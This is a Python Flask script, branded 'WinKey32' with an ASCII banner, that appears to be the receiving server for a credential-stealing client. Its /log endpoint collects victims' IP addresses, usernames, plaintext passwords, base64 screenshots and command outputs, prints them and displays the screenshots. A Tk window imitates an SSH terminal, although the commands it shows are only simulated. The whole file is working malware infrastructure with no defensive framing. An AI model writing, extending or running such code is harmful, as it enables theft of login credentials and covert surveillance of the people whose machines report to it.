import os
import sys
import shutil
from PIL import Image
import pyfiglet
from flask import Flask, request, jsonify
import time
import socket
import requests
import base64
import tempfile
import threading
from PIL import Image, ImageTk
import tkinter as tk
from tkinter import ttk, scrolledtext
import subprocess

ASCII_CHARS = "@%#*+=-:. "

def resize_image(image, new_width=50):
    width, height = image.size
    aspect_ratio = height / width
    new_height = int(aspect_ratio * new_width * 0.55)
    return image.resize((new_width, new_height))

def to_ascii(image):
    image = image.convert("RGB")
    pixels = image.getdata()
    ascii_str = ""
    for i, (r, g, b) in enumerate(pixels):
        gray = int((r + g + b) / 3)
        ascii_char = ASCII_CHARS[gray * (len(ASCII_CHARS) - 1) // 255]
        ascii_str += f"\033[38;2;{r};{g};{b}m{ascii_char}"
        if (i + 1) % image.width == 0:
            ascii_str += "\n"
    return ascii_str

def print_black(line="", color_prefix=""):
    """Print a line that ALWAYS fills the full terminal width with black bg."""
    width = shutil.get_terminal_size((80, 24)).columns
    padded = line.ljust(width)
    sys.stdout.write(f"\033[48;2;0;0;0m{color_prefix}{padded}\033[0m\n")
    sys.stdout.flush()

def clear_screen_black():
    """Clear screen and fill with black background once."""
    sys.stdout.write("\033[48;2;0;0;0m\033[2J\033[H")
    sys.stdout.flush()

def display_banner():
    clear_screen_black()

    # ASCII art logo
    ascii_banner = pyfiglet.figlet_format("WinKey32")
    for line in ascii_banner.splitlines():
        print_black(line, "\033[38;2;255;0;0m")

    # Then the image ASCII
    path = "windowsxp.png"
    try:
        image = Image.open(path)
    except Exception as e:
        print_black(f"Unable to open {path}. Error: {e}")
        return

    image = resize_image(image, new_width=50)
    ascii_img = to_ascii(image)
    for line in ascii_img.splitlines():
        print_black(line)

# Flask app
app = Flask(__name__)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/log', methods=['POST'])
def log_attempt():
    data = request.json
    ip = data.get('ip', 'Unknown')
    username = data.get('username', 'Unknown')
    password = data.get('password', 'Unknown')
    success = data.get('success', False)
    screenshot_b64 = data.get('screenshot', '')
    command_outputs = data.get('command_outputs', {})

    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
    status_text = "\033[38;2;0;255;0mSUCCESS" if success else "\033[38;2;255;0;0mFAILED"

    print_black(f"[{timestamp}] New login attempt:")
    print_black(f"  IP: \033[38;2;0;255;255m{ip}\033[0m")
    print_black(f"  Username: \033[38;2;255;255;0m{username}\033[0m")
    print_black(f"  Password: \033[38;2;255;255;0m{password}\033[0m")
    print_black(f"  Status: {status_text}\033[0m")
    
    # If SSH connection was successful, show additional info
    if success:
        print_black(f"  SSH: \033[38;2;0;255;0mPort 22 opened, connection established\033[0m")
        
        # Display command outputs
        for cmd, output in command_outputs.items():
            print_black(f"  Command: \033[38;2;255;255;0m{cmd}\033[0m")
            print_black(f"  Output: \033[38;2;0;255;0m{output}\033[0m")
        
        # Simulate current directory using the password
        print_black(f"  Current Directory: \033[38;2;255;255;0mC:\\Users\\{username}\\{password}\033[0m")
        
        # Start a simulated terminal session
        print_black(f"  Starting SSH terminal session...")
        threading.Thread(target=simulate_terminal, args=(username, password, command_outputs)).start()
    
    # If screenshot is available, save and display it
    if screenshot_b64:
        try:
            # Create a temporary file for the screenshot
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
                temp_path = temp_file.name
                # Decode the base64 string and write to file
                img_data = base64.b64decode(screenshot_b64)
                temp_file.write(img_data)
            
            # Display the screenshot in a separate thread
            threading.Thread(target=display_screenshot, args=(temp_path,)).start()
            
            print_black(f"  Screenshot: \033[38;2;0;255;0mSaved and displayed\033[0m")
        except Exception as e:
            print_black(f"  Screenshot Error: \033[38;2;255;0;0m{str(e)}\033[0m")

    return jsonify({"status": "logged"})

def simulate_terminal(username, password, command_outputs):
    """Simulate a terminal session with the client"""
    try:
        # Create a terminal window
        root = tk.Tk()
        root.title(f"SSH Terminal - {username}@{socket.gethostname()}")
        
        # Set window size and position
        window_width = 800
        window_height = 600
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        
        # Create a frame for the terminal
        frame = ttk.Frame(root, padding="10")
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Create a text widget for the terminal output
        terminal = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=20, 
                                           bg="black", fg="white", font=("Courier New", 12))
        terminal.pack(fill=tk.BOTH, expand=True)
        
        # Create an entry widget for commands
        entry_frame = ttk.Frame(frame)
        entry_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(entry_frame, text=f"{username}@{socket.gethostname()}: C:\\Users\\{username}\\{password} $ ").pack(side=tk.LEFT)
        
        command_entry = ttk.Entry(entry_frame, width=60)
        command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        command_entry.focus()
        
        # Function to execute a command
        def execute_command(event=None):
            cmd = command_entry.get()
            if not cmd:
                return
                
            # Display the command in the terminal
            terminal.insert(tk.END, f"{username}@{socket.gethostname()}: C:\\Users\\{username}\\{password} $ {cmd}\n")
            terminal.see(tk.END)
            
            # Clear the entry
            command_entry.delete(0, tk.END)
            
            # Execute the command
            try:
                if cmd.lower() == "exit":
                    root.destroy()
                    return
                    
                # Simulate command execution
                if cmd.lower() == "whoami":
                    output = command_outputs.get("whoami", username)
                elif cmd.lower() == "hostname":
                    output = command_outputs.get("hostname", socket.gethostname())
                elif cmd.lower().startswith("echo"):
                    output = cmd[5:]  # Remove "echo "
                elif cmd.lower() == "pwd":
                    output = f"C:\\Users\\{username}\\{password}"
                elif cmd.lower() == "ls":
                    output = "desktop.txt\ndocuments/\ndownloads/\nmusic/\npictures/\nvideos/"
                elif cmd.lower() == "help":
                    output = "Available commands: whoami, hostname, echo, pwd, ls, help, exit"
                else:
                    output = f"'{cmd}' is not recognized as an internal or external command,\noperable program or batch file."
                
                # Display the output
                terminal.insert(tk.END, f"{output}\n\n")
                terminal.see(tk.END)
            except Exception as e:
                terminal.insert(tk.END, f"Error: {str(e)}\n\n")
                terminal.see(tk.END)
        
        # Bind the Enter key to execute the command
        command_entry.bind("<Return>", execute_command)
        
        # Add a button to execute the command
        execute_btn = ttk.Button(entry_frame, text="Execute", command=execute_command)
        execute_btn.pack(side=tk.RIGHT)
        
        # Add initial welcome message
        terminal.insert(tk.END, f"Microsoft Windows [Version 10.0.19043.1348]\n")
        terminal.insert(tk.END, f"(c) Microsoft Corporation. All rights reserved.\n\n")
        terminal.insert(tk.END, f"Connected to {username}@{socket.gethostname()}\n")
        terminal.insert(tk.END, f"Current directory: C:\\Users\\{username}\\{password}\n\n")
        
        # Start the Tkinter event loop
        root.mainloop()
    except Exception as e:
        print(f"Error simulating terminal: {e}")

def display_screenshot(image_path):
    """Display a screenshot in a Tkinter window"""
    try:
        # Create the main window
        root = tk.Tk()
        root.title("Remote Screenshot")
        
        # Set window size and position
        window_width = 800
        window_height = 600
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        
        # Create a frame for the image
        frame = ttk.Frame(root, padding="10")
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Load the image
        img = Image.open(image_path)
        img = ImageTk.PhotoImage(img)
        
        # Create a label to display the image
        img_label = ttk.Label(frame, image=img)
        img_label.image = img  # Keep a reference
        img_label.pack(fill=tk.BOTH, expand=True)
        
        # Add a close button
        close_btn = ttk.Button(frame, text="Close", command=root.destroy)
        close_btn.pack(pady=10)
        
        # Start the Tkinter event loop
        root.mainloop()
        
        # Clean up the temporary file
        try:
            os.unlink(image_path)
        except:
            pass
    except Exception as e:
        print(f"Error displaying screenshot: {e}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        if response.status_code == 200:
            return response.json().get('ip', 'Unknown')
    except:
        pass
    return "Unknown"

def run_server():
    display_banner()

    local_ip = get_local_ip()
    public_ip = get_public_ip()
    port = 5000

    print_black(f"[+] Server started on {local_ip}:{port}", "\033[38;2;0;255;0m")
    if public_ip != "Unknown":
        print_black(f"[+] Public IP: {public_ip}", "\033[38;2;0;255;0m")
    print_black(f"[+] Listening for clients...", "\033[38;2;255;255;0m")

    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

if __name__ == "__main__":
    run_server()